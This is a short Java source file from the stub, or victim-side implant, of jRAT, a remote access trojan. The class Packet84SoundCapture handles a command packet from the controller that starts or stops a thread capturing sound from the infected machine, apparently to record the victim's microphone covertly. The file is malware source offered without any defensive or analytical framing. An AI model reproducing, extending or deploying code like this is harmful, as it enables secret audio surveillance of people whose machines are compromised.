package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;
import io.jrat.stub.Sound;

public class Packet84SoundCapture extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		if (Connection.readBoolean()) {
			new Thread(new Sound()).start();
		} else {
			Sound.instance.running = false;
		}
	}

}
